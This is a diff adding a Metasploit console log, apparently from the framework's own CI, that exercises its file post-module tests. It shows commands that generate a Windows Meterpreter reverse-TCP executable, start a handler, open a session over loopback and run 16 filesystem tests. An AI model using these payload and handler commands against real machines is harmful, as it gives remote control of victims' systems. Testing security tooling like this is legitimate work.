@@ -1,0 +1,63 @@
+use windows/meterpreter/reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20231026-6832-u1p7t4txt
+msf6 payload(windows/meterpreter/reverse_tcp) > msf6 payload(windows/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/windowsmeterpreterreverse_tcp_session_tlv_logging20231026-6832-u1p7t4txt
+msf6 payload(windows/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20231026-6832-f0g8jw.exe -f exe AutoVerifySessionTimeout=30 lport=6006 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/windowsmeterpreterreverse_tcp_debug_log20231026-6832-7s7i32txt MeterpreterDebugBuild=true
+[*] Writing 73802 bytes to D:/a/_temp/child-process-rb-windows-meterpreter-reverse-tcp20231026-6832-f0g8jw.exe...
+msf6 payload(windows/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 5
+msf6 payload(windows/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6006 
+[*] Sending stage (230990 bytes) to 127.0.0.1
+[*] Meterpreter session 6 opened (127.0.0.1:6006 -> 127.0.0.1:50080) at 2023-10-26 19:06:37 +0000
+use test/file
+msf6 post(test/file) > run session=6 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: C:\Users\RUNNER~1\AppData\Local\Temp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-ylcjesgt
+[*] meterpreter-test-dir-ylcjesgt created
+[*] Setup: Now in C:\Users\RUNNER~1\AppData\Local\Temp\meterpreter-test-dir-ylcjesgt
+[*] Running against session 6
+[*] Session type is meterpreter and platform is windows
+[+] should test for directory existence
+[*] [should create directories] Creating directory meterpreter-test-dir
+[*] [should create directories] meterpreter-test-dir created
+[*] [should create directories] Creating directory meterpreter-test-dir\directory
+[*] [should create directories] meterpreter-test-dir\directory created
+[+] should create directories
+[+] should list the directory we just made
+[+] should recursively delete the directory we just made
+[*] [should delete a symbolic link target] Creating directory meterpreter-test-dir
+[*] [should delete a symbolic link target] meterpreter-test-dir created
+[+] should delete a symbolic link target
+[*] [should not recurse into symbolic link directories] Creating directory meterpreter-test-dir.1
+[*] [should not recurse into symbolic link directories] meterpreter-test-dir.1 created
+[*] [should not recurse into symbolic link directories] Creating directory meterpreter-test-dir.2
+[*] [should not recurse into symbolic link directories] meterpreter-test-dir.2 created
+[+] should not recurse into symbolic link directories
+[*] [should write binary data] Writing 128000 bytes
+[*] [should write binary data] Finished in 0.1885238
+[+] should write binary data
+[*] [should read the binary data we just wrote] Read 128000 bytes
+[+] should read the binary data we just wrote
+[+] should delete binary files
+[*] [should append binary data] expected: [222, 173, 190, 239] - ASCII-8BIT
+[*] [should append binary data] actual: [222, 173, 190, 239] - ASCII-8BIT
+[+] should append binary data
+[+] should test for file existence
+[+] should create text files
+[+] should read the text we just wrote
+[+] should append text files
+[+] should delete text files
+[+] should move files
+[*] Testing complete in 7.83 seconds
+[*] Passed: 16; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+msf6 post(test/file) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 6 closed.
+msf6 post(test/file) > Stopping all jobs...
+msf6 post(test/file) > 
